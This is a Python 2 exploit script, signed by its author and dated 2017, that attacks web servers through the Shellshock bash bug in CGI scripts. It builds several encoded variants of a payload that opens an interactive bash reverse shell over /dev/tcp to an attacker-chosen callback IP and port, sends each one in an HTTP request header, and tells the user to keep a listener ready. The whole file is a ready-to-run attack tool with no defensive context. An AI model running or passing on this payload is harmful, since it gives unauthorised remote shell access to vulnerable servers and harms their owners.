#!/usr/bin/env python2.7

import socket, urllib, sys, os, time
NARGS=len(sys.argv)

if (NARGS <= 5):
    print(\
"""[#] USAGE: 
	sys.argv[0]: %s
	sys.argv[1]: [targetIP]
	sys.argv[2]: [targPort] 
	sys.argv[3]: [cxback-IP]
	sys.argv[4]: [cxback-PORT]
	sys.argv[5]: [target cgi URI] (ex:, /cgi-bin/test.cgi)
	sys.argv[6]: [form input name] (ex:, Test)

[!!] Set your listener to kill AKA "quieter you become,  moar you can har har"
""" % sys.argv[0])
    sys.exit()


paydirt1 = ("env x='() { :something;};'/bin/bash -i >& /dev/tcp/%s/%s 0>&1" % (sys.argv[3], sys.argv[4]))
paydirt2 = ("() { :something;};/bin/bash -i >& /dev/tcp/%s/%s 0>&1" % (sys.argv[3], sys.argv[4]))
rvsh1 = urllib.quote(paydirt1)
rvsh2 = urllib.quote(paydirt2)
rvsh3 = urllib.quote_plus(paydirt1)
rvsh4 = urllib.quote_plus(paydirt2)



def slammer(a):
    print("[!] Trying %s" % a)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((sys.argv[1], int(sys.argv[2])))
        # r = s.recv(1024)
        # print("\nresponse:\n" + r)
    except:
        print "socket() failed"
        sys.exit(1)
    payload = (\
"""GET %s HTTP/1.1
Host: %s
Content-type: 'application/x-www-form-urlencoded'
%s: %s

""" % (sys.argv[5], sys.argv[3], sys.argv[6], a))
    s.send(payload)
    # r = s.recv(256)
    # print(r)
    s.close()
    time.sleep(2)


if __name__ == "__main__":
    for Z in [paydirt1, paydirt2, rvsh1, rvsh2, rvsh3, rvsh4]: slammer(Z)
    print("[.] Shell by now if host is vulners up in this")

# SYANiDE 2017-5-20.  I code like I fcuk.  Quick, dirty, and without comment.
